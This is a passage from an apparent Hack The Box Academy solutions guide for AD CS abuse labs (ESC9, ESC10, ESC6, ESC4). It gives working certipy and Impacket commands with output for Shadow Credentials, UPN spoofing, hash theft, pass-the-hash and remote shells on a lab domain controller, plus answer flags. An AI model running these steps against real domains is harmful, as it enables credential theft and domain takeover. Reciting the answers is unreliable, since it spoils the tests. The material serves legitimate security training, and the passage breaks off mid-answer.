        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
    [!] Vulnerabilities
      ESC9                              : 'LAB.LOCAL\\Domain Users' can enroll and template has no security extension
```

Before abusing `ESC9` and using the `Shadow Credentials` technique, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to takeover the `user2` user with `Shadow Credentials` (which is possible due to the user `blwasp` having `FullControl` over `user2`, allowing `certipy` to request the TGT for `user2` and `Un-PAC-the-hash` within it), students need to use the `shadow` command of `certipy` along with the `auto` positional argument, specifying `user2` for the `-account` option; students will attain the NT hash `ee22ddf0f8a66db4217050e6a948f9d6` for the `user2` user:

Code: shell

```shell
certipy shadow auto -u blwasp@lab.local -p Password123! -account user2
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy shadow auto -u blwasp@lab.local -p Password123! -account user2

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'user2'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'bddd49f4-baa6-4f7f-e04c-4d87cf381bc5'
[*] Adding Key Credential with device ID 'bddd49f4-baa6-4f7f-e04c-4d87cf381bc5' to the Key Credentials for 'user2'
[*] Successfully added Key Credential with device ID 'bddd49f4-baa6-4f7f-e04c-4d87cf381bc5' to the Key Credentials for 'user2'
[*] Authenticating as 'user2' with the certificate
[*] Using principal: user2@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'user2.ccache'
[*] Trying to retrieve NT hash for 'user2'
[*] Restoring the old Key Credentials for 'user2'
[*] Successfully restored the old Key Credentials for 'user2'
[*] NT hash for 'user2': ee22ddf0f8a66db4217050e6a948f9d6
```

Answer: `ee22ddf0f8a66db4217050e6a948f9d6`

# ESC9

## Question 2

### "Abuse the ESC9 misconfiguration. What is the NT hash of user3?"

To abuse `ESC9` and steal the NT hash of the user `user3`, students first need to update the `UPN` of `user2` to be that of `user3` by using the `account` command of `certipy` along with the `update` positional argument, specifying `user2` for the `-user` option and `user3` for the `-upn` option:

Code: shell

```shell
certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user3
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user3

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'user2':
    userPrincipalName                   : user3
[*] Successfully updated 'user2'
```

Afterward, students need to use the `req` command of `certipy`, specifying the template `ESC9` for the `-template` option and the previously attained NT hash `ee22ddf0f8a66db4217050e6a948f9d6` of `user2` for the `-hashes` option; students will attain a `PFX` certificate for the user `user3`:

Code: shell

```shell
certipy req -u user2@lab.local -ca lab-LAB-DC-CA -template ESC9 -hashes ee22ddf0f8a66db4217050e6a948f9d6
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy req -u 'user2@lab.local' -ca lab-LAB-DC-CA -template ESC9 -hashes ee22ddf0f8a66db4217050e6a948f9d6 

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 63
[*] Got certificate with UPN 'user3'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'user3.pfx'
```

Subsequently, students need to revert the `UPN` of `user2` to its original value (i.e., `user2`), using the `account` command of `certipy` along with the `update` positional argument, specifying `user2` for the `-user` and `-upn` options:

Code: shell

```shell
certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user2
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user2

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'user2':
    userPrincipalName                   : user2
[*] Successfully updated 'user2'
```

At last, utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `user3` and `Un-PAC-the-hash` within it; students will attain the NT hash `01b60104db80993eb9ead5d8f9127eec`:

Code: shell

```shell
certipy auth -pfx user3.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy auth -pfx user3.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: user3@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'user3.ccache'
[*] Trying to retrieve NT hash for 'user3'
[*] Got hash for 'user3@lab.local': aad3b435b51404eeaad3b435b51404ee:01b60104db80993eb9ead5d8f9127eec
```

Answer: `01b60104db80993eb9ead5d8f9127eec`

# ESC9

## Question 3

### "Using user3's credentials, get the content of the flag at \\\\lab.local\\user3\\flag.txt"

Using the previously attained NT hash `01b60104db80993eb9ead5d8f9127eec` of `user3`, students need to `pass-the-hash` with `smbclient` to download the file from `//lab.local/user3/flag.txt`:

Code: shell

```shell
smbclient //lab.local/user3 -U lab.local/user3 --pw-nt-hash 01b60104db80993eb9ead5d8f9127eec -N -c "get flag.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ smbclient //lab.local/user3 -U lab.local/user3 --pw-nt-hash 01b60104db80993eb9ead5d8f9127eec -N -c "get flag.txt"

getting file \flag.txt of size 21 as flag.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
```

At last, when reading the contents of the file `flag.txt`, students will attain the flag `HTB{RESTR1CTED_SHARE}`:

Code: cmd

```cmd
cat flag.txt
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ cat flag.txt

HTB{RESTR1CTED_SHARE}
```

Answer: `HTB{RESTR1CTED_SHARE}`

# ESC10

## Question 1

### "Abuse ESC10 and Resource-Based Constrained Delegation to compromise the DC and submit the content of the flag C:\\Windows\\System32\\rbcd.txt"

After spawning the target machine, and before abusing `ESC10` and using the `Shadow Credentials` technique, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-aoyamvb8qf]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to takeover the `user2` user with `Shadow Credentials` (which is possible due to the user `blwasp` having `FullControl` over `user2`, allowing `certipy` to request the TGT for `user2` and `Un-PAC-the-hash` within it), students need to use the `shadow` command of `certipy` along with the `auto` positional argument, specifying `user2` for the `-account` option; students will attain the NT hash `ee22ddf0f8a66db4217050e6a948f9d6` for the `user2` user:

Code: shell

```shell
certipy shadow auto -u blwasp@lab.local -p Password123! -account user2
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-aoyamvb8qf]─[~]
└──╼ [★]$ certipy shadow auto -u blwasp@lab.local -p Password123! -account user2

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'user2'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2955b91a-876d-fdc1-9425-c88702051ede'
[*] Adding Key Credential with device ID '2955b91a-876d-fdc1-9425-c88702051ede' to the Key Credentials for 'user2'
[*] Successfully added Key Credential with device ID '2955b91a-876d-fdc1-9425-c88702051ede' to the Key Credentials for 'user2'
[*] Authenticating as 'user2' with the certificate
[*] Using principal: user2@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'user2.ccache'
[*] Trying to retrieve NT hash for 'user2'
[*] Restoring the old Key Credentials for 'user2'
[*] Successfully restored the old Key Credentials for 'user2'
[*] NT hash for 'user2': ee22ddf0f8a66db4217050e6a948f9d6
```

Afterward, students need to update the `UPN` of `user2` to be that of `Administrator` by using the `account` command of `certipy` along with the `update` positional argument, specifying `user2` for the `-user` option and `Administrator` for the `-upn` option:

Code: shell

```shell
certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-bnvlm3dysz]─[~]
└──╼ [★]$ certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'user2':
    userPrincipalName                   : Administrator
[*] Successfully updated 'user2'
```

Then, students need to use the `req` command of `certipy`, specifying the template `User` (which allows `Client Authentication`) for the `-template` option and the previously attained NT hash `ee22ddf0f8a66db4217050e6a948f9d6` of `user2` for the `-hashes` option; students will attain a `PFX` certificate for the user `Administrator`:

Code: shell

```shell
certipy req -u user2@lab.local -hashes ee22ddf0f8a66db4217050e6a948f9d6 -ca lab-LAB-DC-CA -template User
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-bnvlm3dysz]─[~]
└──╼ [★]$ certipy req -u user2@lab.local -hashes ee22ddf0f8a66db4217050e6a948f9d6 -ca lab-LAB-DC-CA -template User

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 66
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-2570265163-3918697770-3667495639-1192'
[*] Saved certificate and private key to 'administrator.pfx'
```

Subsequently, students need to revert the `UPN` of `user2` to its original value (i.e., `user2`), using the `account` command of `certipy` along with the `update` positional argument, specifying `user2` for the `-user` and `-upn` options:

Code: shell

```shell
certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user2
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-aoyamvb8qf]─[~]
└──╼ [★]$ certipy account update -u blwasp@lab.local -p Password123! -user user2 -upn user2

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'user2':
    userPrincipalName                   : user2
[*] Successfully updated 'user2'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `2b576acbe6bcfda7294d6bd18041b8fe`:

Code: shell

```shell
certipy auth -pfx administrator.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-bnvlm3dysz]─[~]
└──╼ [★]$ certipy auth -pfx administrator.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

With the TGT for the `Administrator` user attained, students need to `pass-the-ticket` with `wmiexec.py` (using `psexec.py` will hinder finding the flag due to the different user it establishes the session with) to gain remote code execution on `LAB-DC.lab.local`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.lab.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
lab\administrator
```

When reading the contents of the file `C:\Windows\System32\rbcd.txt`, students will attain the flag `HTB{ESC10_ATT4CK}`:

Code: cmd

```cmd
more "C:\Windows\System32\rbcd.txt"
```

```
C:\>more "C:\Windows\System32\rbcd.txt"

HTB{ESC10_ATT4CK}
```

Alternatively, students can `pass-the-hash` `2b576acbe6bcfda7294d6bd18041b8fe` with `wmiexec.py` and exfiltrate the contents of the file `C:\Windows\System32\rbcd.txt` directly:

Code: shell

```shell
wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Windows\System32\rbcd.txt"
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ wmiexec.py -no-pass -hashes :2b576acbe6bcfda7294d6bd18041b8fe administrator@LAB-DC.lab.local "more C:\Windows\System32\rbcd.txt"

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
HTB{ESC10_ATT4CK}
```

Answer: `HTB{ESC10_ATT4CK}`

# ESC6

## Question 1

### "Which flag, if set, makes the server vulnerable to ESC6 if not updated?"

If the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set, it renders a CA vulnerable to `ESC6`, unless it is updated:

![[HTB Solutions/CAPE/z. images/9d3036a25d163344999df1841ec021cb_MD5.jpg]]

Answer: `EDITF_ATTRIBUTESUBJECTALTNAME2`

# ESC6

## Question 2

### "Abuse the ESC6 misconfiguration and submit Jeffry's NT hash."

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the CA suffers from the `ESC6` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : lab-LAB-DC-CA
    DNS Name                            : LAB-DC.lab.local
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00
    Certificate Validity End            : 2027-03-26 00:17:46+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Disabled
    Permissions
      Owner                             : LAB.LOCAL\Administrators
      Access Rights
        Enroll                          : LAB.LOCAL\Authenticated Users
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Josy
        ManageCa                        : LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\James
                                          LAB.LOCAL\user_manageCA
                                          LAB.LOCAL\Juanmy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
        ManageCertificates              : LAB.LOCAL\Josy
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
<SNIP>
```

Before abusing `ESC6`, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Abusing `ESC6` is similar to abusing `ESC1`; students need to use the `req` command of `certipy`, specifying the template `User` (which allows `Client Authentication`) for the `-template` option and the `UPN` `Jeffry` for the `-upn` option; students will attain a `PFX` certificate for the `Jeffry` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -upn jeffry
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template User -upn jeffry@lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 67
[*] Got certificate with UPN 'jeffry@lab.local'
[*] Certificate object SID is 'S-1-5-21-2570265163-3918697770-3667495639-1103'
[*] Saved certificate and private key to 'jeffry.pfx'
```

At last, students need to use the `auth` command of `certipy` to request a TGT for `Jeffry` and `Un-PAC-the-hash` within it; students will attain the NT hash `b9f1864b07e5fb180122e46b60f86f50`:

Code: shell

```shell
certipy auth -pfx jeffry.pfx
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy auth -pfx jeffry.pfx

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: jeffry@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'jeffry.ccache'
[*] Trying to retrieve NT hash for 'jeffry'
[*] Got hash for 'jeffry@lab.local': aad3b435b51404eeaad3b435b51404ee:b9f1864b07e5fb180122e46b60f86f50
```

Answer: `b9f1864b07e5fb180122e46b60f86f50`

# ESC4

## Question 1

### "Abuse ESC4 to change the configuration for the template ESC4. Afterward, submit the value of the property Certificate Name Flag."

After spawning the target machine, students need to use `certipy` with the `find` command and the `-vulnerable` option to enumerate the ADCS CA for vulnerabilities, utilizing the credentials `blwasp@lab.local:Password123!`; students will discover that the `ESC4` template suffers from the `ESC4` misconfiguration:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip STMIP -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.228.236 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
<SNIP>
  2
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectRequireEmail
                                          SubjectAltRequireEmail
                                          SubjectAltRequireUpn
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Black Wasp
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
        Write Property Principals       : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrator
                                          LAB.LOCAL\Black Wasp
    [!] Vulnerabilities
      ESC4                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
```

Before abusing `ESC4` and using the `Shadow Credentials` technique, students need to add vHost entries for the domain name `lab.local`, the CA's name `lab-LAB-DC-CA`, and its machine's DNS name `LAB-DC.lab.local` (which is also the DC's DNS name):

Code: shell

```shell
sudo sh -c 'echo "STMIP lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.228.236 lab.local lab-LAB-DC-CA LAB-DC.lab.local" >> /etc/hosts'
```

Subsequently, to abuse `ESC4`, students need to use the `template` command of `certipy`, specifying the template `ESC4` for the `-template` option:

Code: shell

```shell
certipy template -u blwasp@lab.local -p Password123! -template ESC4
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy template -u blwasp@lab.local -p Password123! -template ESC4

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'
```

`certipy` will abuse the privileges that `blwasp` has over the `ESC4` template to render it vulnerable to `ESC1`, `ESC2`, and `ESC3`; therefore, when using the `find` command to enumerate the ADCS CA for vulnerabilities, students will discover that the field `Certificate Name Flag` has the value `EnrolleeSuppliesSubject`:

Code: shell

```shell
certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.249.206 -vulnerable -stdout
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy find -u blwasp@lab.local -p Password123! -dc-ip 10.129.249.206 -vulnerable -stdout

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 41 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Trying to get CA configuration for 'lab-LAB-DC-CA' via CSRA
[*] Got CA configuration for 'lab-LAB-DC-CA'
<SNIP> 
 2
    Template Name                       : ESC4
    Display Name                        : ESC4
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Authenticated Users
        Write Owner Principals          : LAB.LOCAL\Authenticated Users
        Write Dacl Principals           : LAB.LOCAL\Authenticated Users
        Write Property Principals       : LAB.LOCAL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : 'LAB.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'LAB.LOCAL\\Authenticated Users' can enroll and template can be used for any purpose
      ESC3                              : 'LAB.LOCAL\\Authenticated Users' can enroll and template has Certificate Request Agent EKU set
      ESC4                              : 'LAB.LOCAL\\Authenticated Users' has dangerous permissions
```

Answer: `EnrolleeSuppliesSubject`

# ESC4

## Question 2

### "Abuse the ESC4 misconfiguration and submit Molly's NT Hash."

From the previous question, students have abused the `ESC4` to render the `ESC4` template vulnerable to `ESC1`, therefore, to abuse it, students need to use the `req` command of `certipy`, specifying the template `ESC4` for the `-template` option and the `UPN` `Molly` for the `-upn` option; students will attain a `PFX` certificate for the `Molly` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC4 -upn Molly
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC4 -upn Molly

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 69
[*] Got certificate with UPN 'Molly'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'molly.pfx'
```

At last, utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Molly` and `Un-PAC-the-hash` within it; students will attain the NT hash `b4d7acc4ed8077f60a163499df9bc779`:

Code: shell

```shell
certipy auth -pfx molly.pfx -domain lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-7vhyh3ar8o]─[~]
└──╼ [★]$ certipy auth -pfx molly.pfx -domain lab.local

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: molly@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'molly.ccache'
[*] Trying to retrieve NT hash for 'molly'
[*] Got hash for 'molly@lab.local': aad3b435b51404eeaad3b435b51404ee:b4d7acc4ed8077f60a163499df9bc779
```

Answer: `b4d7acc4ed8077f60a163499df9bc779`

# ESC4

## Question 3

### "Abuse the ESC4 misconfiguration to impersonate the Administrator account. What is the value of the flag file at C:\\Users\\molly\\Desktop\\flag.txt?"

From the first question, students have abused the `ESC4` to render the `ESC4` template vulnerable to `ESC1`, therefore, to abuse it and impersonate `Administrator`, students need to use the `req` command of `certipy`, specifying the template `ESC4` for the `-template` option and the `UPN` `Administrator` for the `-upn` option; students will attain a `PFX` certificate for the `Administrator` user:

Code: shell

```shell
certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC4 -upn Administrator
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy req -u blwasp@lab.local -p Password123! -ca lab-LAB-DC-CA -template ESC4 -upn Administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 70
[*] Got certificate with UPN 'Administrator@lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Utilizing the certificate, students need to use the `auth` command of `certipy` to request a TGT for `Administrator` and `Un-PAC-the-hash` within it; students will attain the NT hash `2b576acbe6bcfda7294d6bd18041b8fe`:

Code: shell

```shell
certipy auth -pfx administrator.pfx 
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ certipy auth -pfx administrator.pfx 

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@lab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

With the TGT for the `Administrator` user attained, students need to `pass-the-ticket` with `wmiexec.py` to gain remote code execution on `LAB-DC.lab.local`:

Code: shell

```shell
KRB5CCNAME=administrator.ccache psexec.py -k -no-pass LAB-DC.lab.local
```

```
┌─[us-academy-1]─[10.10.15.48]─[htb-ac-413848@htb-dcsgrv7yfv]─[~]
└──╼ [★]$ KRB5CCNAME=administrator.ccache psexec.py -k -no-pass LAB-DC.lab.local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on LAB-DC.lab.local.....
[*] Found writable share ADMIN$
[*] Uploading file fDKSqGos.exe
[*] Opening SVCManager on LAB-DC.lab.local.....
[*] Creating service hKhQ on LAB-DC.lab.local.....
[*] Starting service hKhQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3772]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

When reading the contents of the file `C:\Users\molly\Desktop\flag.txt`, students will attain the flag `HTB{ESC4_MSPKI}`:

Code: shell

```shell
more C:\Users\molly\Desktop\flag.txt
```

```
